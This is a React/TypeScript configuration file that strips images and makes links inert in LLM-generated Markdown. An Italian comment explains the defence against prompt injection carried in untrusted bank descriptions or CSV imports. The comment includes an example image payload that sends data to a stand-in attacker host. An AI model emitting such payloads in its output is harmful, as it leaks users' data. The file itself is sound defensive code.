import type { ReactNode } from 'react';
import remarkGfm from 'remark-gfm';

/**
 * Hardening del Markdown prodotto dall'LLM: il modello può aver letto testo non
 * fidato (causali bancarie, descrizioni importate da CSV), quindi immagini e
 * link vengono neutralizzati — un `![](https://attaccante/?dati)` renderizzato
 * esfiltrerebbe dati al solo caricamento, e un link cliccabile è phishing.
 * Le immagini spariscono, i link restano come testo inerte.
 * Usato dalla chat e dal report LLM della pagina Report.
 */
export const MARKDOWN_REMARK_PLUGINS = [remarkGfm];

export const MARKDOWN_COMPONENTS = {
  img: () => null,
  table: ({ children }: { children?: ReactNode }) => (
    <div className="my-3 overflow-x-auto">
      <table>{children}</table>
    </div>
  ),
  a: ({ children }: { children?: ReactNode }) => <span className="underline">{children}</span>,
};
